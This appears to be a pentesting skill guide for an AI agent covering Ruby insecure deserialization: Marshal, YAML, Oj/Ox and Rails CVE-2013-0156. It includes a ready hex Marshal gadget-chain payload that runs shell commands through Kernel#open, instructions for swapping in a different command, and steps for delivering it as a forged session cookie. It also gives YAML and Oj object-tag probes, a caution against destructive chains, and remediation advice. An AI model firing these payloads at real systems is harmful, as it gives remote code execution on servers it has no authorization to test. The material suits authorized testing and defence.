# Insecure deserialization (Ruby)

Ruby `Marshal.load`, `YAML.load`/`Psych`, and `Oj`/`Ox` will instantiate
arbitrary objects from attacker data → RCE via gadget chains. Hunt for blobs you
control that get deserialized: cookies, params, cache entries, uploaded files,
API bodies.

1. **Spot Marshal**: a base64 value starting `BAh` (decodes to the magic bytes
   `\x04\x08`) ⇒ `Marshal.dump` output. Decode any cookie/param/body field in
   `browser_evaluate_js`: `atob(v)` and check the first two bytes are `04 08`.
   An *unsigned/unencrypted* Marshal cookie (legacy `ActionDispatch::Session::
   CookieStore` with `serializer: :marshal`) is directly forgeable — see skill:
   session-cookie-crypto for the secret/HMAC angle.
2. **Universal gadget (no app code needed)** — `Gem::StubSpecification`/
   `Gem::Source::SpecificFile`/`Gem::DependencyList`/`Gem::Requirement` (RubyGems
   stdlib, always loaded) chain `marshal_load` → `Gem::DependencyList#each` →
   `sort` → `<=>` → `Gem::StubSpecification#name` → `Kernel#open(@loaded_from)`.
   Ready payload (Ruby <=2.7.2/pre Rails 6.1 — test, later patched):
   `0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64
   656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a5370
   65636966696346696c65063a0a40737065636f3a1b47656d3a3a537475625370656369666
   9636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645
   543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446`
   embeds `Kernel#open("|id 1>&2")` — output goes to server STDERR, not the
   response, so it is NOT provable in-band as-is. Swap the command: the string
   is `I"` + length-byte + bytes (`len+5` for 0-122, e.g. `0d`=8 chars for
   `|id 1>&2`). Replace hex `0d7c696420313e2632` with `0e7c736c656570203130`
   (`|sleep 10`, 9 chars → length byte `0e`) for an in-band timing proof
   instead. Convert with `h2b`→`b2b64` in `browser_evaluate_js`, deliver as the
   session cookie: `http_request({url, cookies:{"_app_session":"<b2b64 output>"}})`,
   then time the round-trip (or read via `http_flow`) — a ~10s delta confirms
   RCE without log access. Get a byte-length wrong → `Marshal.load` errors at an
   offset, same failure mode as the PHP `unserialize()` recipe.
3. **Spot YAML**: a param/body/upload whose value is YAML text. `YAML.load`
   (pre-Psych4 default) deserializes `!ruby/object:`, `!ruby/hash:`,
   `!ruby/struct`. Probe for parsing by sending benign YAML and watching for a
   `Psych::` error in the dev trace; an `!ruby/object:OpenStruct` round-trip
   confirms object instantiation. (`Psych.safe_load`/Psych4 default is safe.)
4. **CVE-2013-0156 (Rails XML/JSON param type coercion)**: old Rails parses
   request params typed via XML/YAML. Send `Content-Type: application/xml` with a
   `<probe type="yaml">` / `type="symbol"` payload via `http_request` and look
   for evaluation/symbol DoS behaviour — pre-3.2.11/2.3.15 ⇒ RCE.
5. **Oj/Ox**: JSON with `Oj.load` in compat/object mode honours
   `"^o":"ClassName"` / `"^c"` tags to instantiate objects. If a JSON API
   reflects type errors on `{"^o":"OpenStruct"}`, object mode is on.
6. **Confirm safely**: prove deserialization (an instantiated-object error, a
   benign timing/DNS gadget, or a reflected attribute) — do NOT fire a full
   destructive RCE chain on a live target.

Evidence: the decoded `\x04\x08`/`!ruby/object` marker + a response proving the
blob was deserialized (object error or controlled effect).
Remediation: never `Marshal.load`/`YAML.load`/`Oj.load(object)` untrusted data —
use `JSON.parse` or `YAML.safe_load`/`Psych.safe_load`; set the cookie/cache
serializer to `:json`; upgrade Rails past CVE-2013-0156.
